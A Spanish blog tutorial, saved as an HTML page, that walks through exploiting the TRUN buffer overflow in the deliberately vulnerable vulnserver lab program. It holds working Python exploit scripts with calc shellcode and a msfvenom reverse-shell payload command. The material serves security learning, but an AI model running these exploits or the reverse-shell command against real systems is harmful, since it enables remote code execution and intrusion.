@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="es-es" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm. Los dos programas que se van a ocupar son:">
+<title> Que es un buffer overflow (vulnserver) (CFT)</title>
+
+<link rel='canonical' href='http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft-copy/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content=" Que es un buffer overflow (vulnserver) (CFT)">
+<meta property='og:description' content="En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm. Los dos programas que se van a ocupar son:">
+<meta property='og:url' content='http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft-copy/'>
+<meta property='og:site_name' content='pacodiazdg.github.io'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='c&#43;&#43;' /><meta property='article:tag' content='bufferoverflow' /><meta property='article:published_time' content='2025-06-07T10:30:00-06:00'/><meta property='article:modified_time' content='2025-06-07T10:30:00-06:00'/><meta property='og:image' content='https://i.imgur.com/6pw7YUX.png' />
+<meta name="twitter:title" content=" Que es un buffer overflow (vulnserver) (CFT)">
+<meta name="twitter:description" content="En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm. Los dos programas que se van a ocupar son:"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/6pw7YUX.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://avatars.githubusercontent.com/u/26071783?v=4" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🗿</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">pacodiazdg.github.io</a></h1>
+            <h2 class="site-description">Blog de programación, electrónica y GNU/Linux.</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts/' >
+                
+                
+                
+                <span>Blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://github.com/PacodiazDG' >
+                
+                
+                
+                <span>Github</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://www.linkedin.com/in/francisco-javier-d-a463901a2/' >
+                
+                
+                
+                <span>Linkedin</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/posts/que-es-un-buffer-overflow-vulnserver-cft-copy/">
+                
+                    <img src="https://i.imgur.com/6pw7YUX.png" loading="lazy" alt="Featured image of post  Que es un buffer overflow (vulnserver) (CFT)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/c&#43;&#43;/" >
+                C&#43;&#43;
+            </a>
+        
+            <a href="/categories/buffer-overflow/" >
+                Buffer Overflow
+            </a>
+        
+            <a href="/categories/windows/" >
+                Windows
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/que-es-un-buffer-overflow-vulnserver-cft-copy/"> Que es un buffer overflow (vulnserver) (CFT)</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">7 June 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.</p>
+<p>Los dos programas que se van a ocupar son:</p>
+<ul>
+<li>x64dbg</li>
+<li>IDA</li>
+<li><a class="link" href="https://github.com/stephenbradshaw/vulnserver"  target="_blank" rel="noopener"
+    >https://github.com/stephenbradshaw/vulnserver</a></li>
+</ul>
+<h3 id="que-es-un-bufferoverflow">Que es un bufferoverflow?
+</h3><p>bufferoverflow se produce cuando se colocan más datos en un búfer de longitud fija de los que el búfer puede manejar.
+en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cadena tiene una longitud mayora a eso por lo que los datos restantes van a sobre escribir el stack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buffer</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(buffer, input);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> Vulnerable<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">buffer</span>(Vulnerable);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img src="https://i.imgur.com/d7syZFV.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="enter image description here"
+	
+	
+></p>
+<p>si compilamos y depuramos vemos que el EIP (puntero de instrucción) no tiene una dirección si no puras &ldquo;aaaa&rdquo; en hax</p>
+<h3 id="encontrar-la-funcion-vulnerable">Encontrar la funcion vulnerable
+</h3><p>para explotar el buffer overflow en vulnserver sin protecciones es bastante fácil</p>
+<p>en este caso remiendo hacer un análisis estático del programa esto es más fácil si se hace desde IDA, el modo grafico nos va a ser de gran ayuda en estos casos para darle seguiento a las funciones</p>
+<p>esta es la función de bienvenida por lo que hay que continuar para ver si hay algún comando vulnerable</p>
+<p><img src="https://i.imgur.com/6pw7YUX.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="enter image description here"
+	
+	
+></p>
+<p>en este caso la funcion3 es candidata para ser explotada y es llamada por varios comandos, pero más especialmente por TRUN ya es la más fácil</p>
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">.text:00401808                 push    ebp
+.text:00401809                 mov     ebp, esp
+.text:0040180B                 sub     esp, 7E8h
+.text:00401811                 mov     eax, [ebp+arg_0]
+.text:00401814                 mov     [esp+7E8h+Source], eax ; Source
+.text:00401818                 lea     eax, [ebp+var_7D8]
+.text:0040181E                 mov     [esp+7E8h+Destination], eax ; Destination
+.text:00401821                 call    _strcpy
+.text:00401826                 leave
+.text:00401827                 retn
+.text:00401827 _Function3      endp
+</code></pre><p>esta funcion es vulnerable ya que _strcpy no tiene ninguna &ldquo;proteccion&rdquo;</p>
+<hr>
+<p><code>strcpy</code></p>
+<p>Copia la cadena C señalada por la fuente en la matriz señalada por el destino , incluido el carácter nulo de terminación (y deteniéndose en ese punto).</p>
+<hr>
+<p>En este caso para probar si es vulnerable vamos intentar enviar cadena de más de 2020 caracteres</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.1.115&#39;</span>;
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	remote_ip <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname( host )
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>gaierror:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((remote_ip , port))
+</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;TRUN _.&#34;</span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2500</span>
+</span></span><span style="display:flex;"><span>exploit<span style="color:#f92672">=</span>command<span style="color:#f92672">+</span>message
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> :
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(exploit<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>reply <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>print (reply)
+</span></span></code></pre></div><p>Lo que buscamos es que se sobrescriba el ESP y después el EIP y como era de esperarse si se sobre escribió el EIP contiene 616161</p>
+<p><img src="https://i.imgur.com/TkhMSIZ.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="enter image description here"
+	
+	
+></p>
+<h3 id="explotacion-cantidad-de-bytes-necesarios">Explotacion (cantidad de bytes necesarios)
+</h3><p>vamos a contar la cantidad bytes que se necesitan para llegar a esp y no sobrescribirlo en este caso recomiendo poner números aleatorios</p>
+<p><img src="https://i.imgur.com/4kBsKSF.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>lo vamos a ejecutar para obtener la cantidad de bytes necesarios para sobrescribir el EIP</p>
+<p><img src="https://i.imgur.com/4kIbqVz.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>invertimos el orden (Endianness)</p>
+<p>30 54 68 37 == 37 68 54 30 == 7hT0</p>
+<p><img src="https://i.imgur.com/3HGhosz.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>buscamos en el texto y obtenemos que se ocupan 2005 bytes para evitar sobrescribir el EIP</p>
+<h3 id="explotacion-jmp-esp">Explotacion (jmp esp)
+</h3><p>vamos a buscar alguna instrucción que nos pueda ayudar a ejecutar el contenido en ESP como por ejemplo jmp esp</p>
+<p>search in &ndash;&gt; all modules &ndash;&gt; find command</p>
+<p>buscamos  jmp esp</p>
+<p><img src="https://i.imgur.com/AfCAzDz.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Address=625011AF
+Disassembly=jmp esp</p>
+<p>esto lo mandamos a EIP lo invetimos (Endianness)</p>
+<p>por lo que nuestro código queda de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.1.115&#39;</span>;
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	remote_ip <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname( host )
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>gaierror:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((remote_ip , port))
+</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;TRUN _.&#34;</span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;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&#34;</span>
+</span></span><span style="display:flex;"><span>epi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\x50\x11\xAF</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>exploit<span style="color:#f92672">=</span>command<span style="color:#f92672">+</span>message<span style="color:#f92672">+</span>epi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> :
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(exploit<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>reply <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>print (reply)
+</span></span></code></pre></div><h3 id="explotacion-shellcode-calc-y-bad-characters">Explotacion (Shellcode calc) y Bad Characters
+</h3><p>pueden usar exploitdb para buscar una shellcode calc o usar msfvenom en mi caso voy a usar exploitdb, una cosa que hay que tener en cuenta son los &ldquo;Bad Characters&rdquo; como mencione la función strcpy busca bytes nulos para terminar por lo que si nuestra sellcode tiene algun \x00 no va a completar la shellcode y no va a funcionar uno de los métodos mas usados en msvenom es -b <code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.109 LPORT=4444  -f c     -b '\x00'</code> donde estoy borrando bytes nulos.</p>
+<p><a class="link" href="https://www.exploit-db.com/exploits/48116"  target="_blank" rel="noopener"
+    >https://www.exploit-db.com/exploits/48116</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.1.115&#39;</span>;
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	remote_ip <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname( host )
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>gaierror:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((remote_ip , port))
+</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN _.&#34;</span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2005</span>
+</span></span><span style="display:flex;"><span>nops <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>shellcode<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>epi<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xAF\x11\x50\x62</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>exploit<span style="color:#f92672">=</span>command<span style="color:#f92672">+</span>message<span style="color:#f92672">+</span>epi<span style="color:#f92672">+</span>nops<span style="color:#f92672">+</span>shellcode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> :
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(exploit)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>reply <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>print (reply)
+</span></span></code></pre></div><p><img src="https://i.imgur.com/63BReCz.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/c&#43;&#43;/">C&#43;&#43;</a>
+        
+            <a href="/tags/bufferoverflow/">Bufferoverflow</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/posts/que-es-un-buffer-overflow-vulnserver-cft/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/6pw7YUX.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/6pw7YUX.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title"> Que es un buffer overflow (vulnserver) (CFT)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 pacodiazdg.github.io
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
